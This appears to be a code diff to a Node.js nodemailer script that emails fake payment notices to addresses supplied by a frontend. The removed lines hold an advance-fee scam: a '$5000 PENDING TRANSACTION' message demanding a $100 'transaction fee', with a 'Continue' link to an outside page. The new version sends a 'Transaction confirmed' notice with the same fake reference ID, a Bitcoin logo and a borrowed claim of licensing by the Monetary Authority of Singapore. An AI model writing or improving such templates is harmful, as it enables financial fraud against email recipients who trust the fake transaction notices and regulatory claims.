@@ -41,45 +41,33 @@ const transporter = nodemailer.createTransport({
 
   // Email options
   const mailOptions = {
-    from: `"My App" <${process.env.EMAIL_USER}>`,
+    from: `"Testmail" <${process.env.EMAIL_USER}>`,
     to: to, // Recipient email from frontend
-    subject: 'Transaction pending and being reviewed (Ref ID - TY-U-753194873157)',
+    subject: 'Transaction confirmed (Ref ID - TY-U-753194873157)',
     text: `Hello ${sanitizedName}!\n\nThank you for subscribing! This email contains updates and images in HTML format, but your email client is displaying the plain-text version. Visit our website for more information: https://x.com`,
     html: `
-  <p style="text-align: center; color: #999999; font-size: 12px;">Hello ${sanitizedName}</p>
-    <!-- <div style="font-family: Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; text-align: center; padding: 20px; background-color: #f1f4f7;">
-    <img src="https://freshknots.in/wp-content/uploads/2023/03/rose.png" alt="logo" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
-    <h1 style="color: #000000; font-size: 36px; margin: 40px 0; font-weight: 900;">$5000 PENDING TRANSACTION</h1>
-    <p style="color: #000000; font-size: 20px; font-weight: bold; text-align: left; line-height: 1.5;">
-        You just receieved $5000 from a bussiness account for the first time, due to security reason you need to pay a transaction fee of $100 before the fund is deposited into your account.
-    </p>
-    <a href="https://millxore.github.io/seen/" style="display: inline-block; color: #ffffff; padding: 15px 40px; background-color: #000000; color: white; text-decoration: none; border-radius: 25px; font-size: 16px; margin: 10px 0; font-weight: bold;">Continue</a>
-  </div> -->
-      
-      <div style="background-color: #f1f4f7; max-width: 600px; margin: 0 auto; padding: 20px;">
+  <div style="text-align: center; background-color: #f1f7f7; max-width: 500px; margin: 0 auto; padding: 20px;">
+          <img src="https://cdn.pixabay.com/photo/2021/04/30/16/47/btc-logo-6219386_1280.png" alt="logo" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
+          <h1 style="font-size: 32px;">Big text</h1>
+          <p>Hello there, ${sanitizedName}!</p>
+      </div>
+      <div style="background-color: #f1f7f7; max-width: 500px; margin: 0 auto; padding: 20px;">
           <div style="text-align: center;">
-              <img src="https://freshknots.in/wp-content/uploads/2023/03/rose.png" alt="logo" style="width: 60px; height: 60px; border-radius: 50%; object-fit: cover;">
               <hr style="margin: 30px auto; border: 1px solid #D3D3D3;">
           </div>
           <div style="text-align: center;">
-              <p style="display: inline-block; font-size: 12px; color: #1a73e8; padding: 0 8px;">Reliable</p>
-              <p style="display: inline-block; font-size: 12px; color: #1a73e8; padding: 0 8px; border-left: 2px solid black;">Secure</p>
-              <p style="display: inline-block; font-size: 12px; color: #1a73e8; padding: 0 8px; border-left: 2px solid black;">Easy</p>
+              <p style="width: 30px; height: 30px; border-radius: 50%; display: inline-block; font-size: 12px; background-color: #f7b611; padding: 0 8px; border: 2px solid white;"></p>
+              <p style="width: 30px; height: 30px; border-radius: 50%; display: inline-block; font-size: 12px; background-color: #f7b611; padding: 0 8px; border: 2px solid white;"></p>
+              <p style="width: 30px; height: 30px; border-radius: 50%; display: inline-block; font-size: 12px; background-color: #f7b611; padding: 0 8px; border: 2px solid white;"></p>
           </div>
           <p style="color: #555; font-size: 14px;">
-     We are committed to preventing fraudulent emails. Emails from us will always contain your full name. <span style="font-size: 12px; color: #1a73e8;">Learn to identify phishing</span>
+              For more info, visit our website!
           </p>
           <p style="color: #555; font-size: 14px;">
-      Please don't reply to this email. To get in touch with us, Check <span style="font-size: 12px; color: #1a73e8;">Help & Contact.</span>
+              Copyright © 1999-2025. All rights reserved. 
           </p>
           <p style="color: #555; font-size: 14px;">
-      For more info, visit our website!
-          </p>
-          <p style="color: #555; font-size: 14px;">
-      Copyright © 1999-2025. All rights reserved. 
-          </p>
-          <p style="color: #555; font-size: 14px;">
-      Rts. Ltd. is licensed by the Monetary Authority of Singapore as a Major Payment Institution under the Payment Services Act 2019.  
+              Rts. Ltd. is licensed by the Monetary Authority of Singapore as a Major Payment Institution under the Payment Services Act 2019.  
           </p>
       </div>
 `
